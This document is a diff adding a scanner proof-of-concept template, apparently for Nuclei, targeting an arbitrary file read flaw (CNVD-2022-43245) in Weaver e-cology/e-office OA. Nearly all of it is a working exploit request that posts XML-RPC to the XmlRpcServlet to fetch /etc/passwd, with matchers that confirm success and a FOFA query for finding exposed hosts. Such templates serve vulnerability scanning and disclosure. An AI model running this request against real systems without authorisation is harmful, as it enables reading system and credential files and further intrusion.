@@ -1,0 +1,35 @@
+id: poc-local-oa-weaver-ecology-v9-XmlRpcServlet-fileread-cnvd-2022-43245
+
+info:
+  name: 泛微OA E-Cology XmlRpcServlet任意文件读取-cnvd-2022-43245
+  author: capiton
+  severity: high
+  description: 上海泛微网络科技股份有限公司e-office存在任意文件读取漏洞，攻击者可利用漏洞获取敏感信息。
+  reference:
+    - https://stack.chaitin.com/security-challenge/poc/detail?id=650
+  metadata:
+    fofa-query: app="泛微-协同办公OA"
+    Vulnerability-Impact: 泛微OA  e-office 9.5
+  tags: weaver,ecology,fanwei
+
+requests:
+  - raw:
+      - |-
+        POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <?xml version="1.0" encoding="UTF-8"?><methodCall>
+        <methodName>WorkflowService.getAttachment</methodName>
+        <params><param><value><string>/etc/passwd</string>
+        </value></param></params></methodCall>
+
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+        part: body
